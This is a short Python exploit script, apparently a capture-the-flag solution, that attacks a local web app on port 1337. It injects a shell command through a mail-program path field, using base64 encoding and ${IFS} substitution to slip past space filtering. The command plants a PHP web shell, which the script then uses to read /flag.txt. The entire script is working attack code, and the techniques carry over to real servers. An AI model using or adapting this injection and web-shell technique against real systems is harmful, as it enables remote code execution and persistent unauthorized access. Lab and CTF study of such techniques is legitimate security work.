import requests
import base64

# submit web shell

php = '<?php system($_GET["cmd"]); ?>'
cmd = f'echo \'{php}\' > /www/rev.php'
cmd = base64.b64encode(cmd.encode()).decode()

data = {
    'from': 'meowName',
    'email': 'meow@email.com',
    'sendMailPath': f'/usr/sbin/sendmail & echo {cmd}|base64 -d|sh',
    'mailProgram': 'sendmail',
}

data['sendMailPath'] = data['sendMailPath'].replace(' ', '${IFS}')

print(f'{data['sendMailPath']=}')

r = requests.post('http://localhost:1337/update', data=data)

# use web shell to read flag
r = requests.post('http://localhost:1337/rev.php?cmd=cat%20/flag.txt', data=data)
print(f'{r.text=}')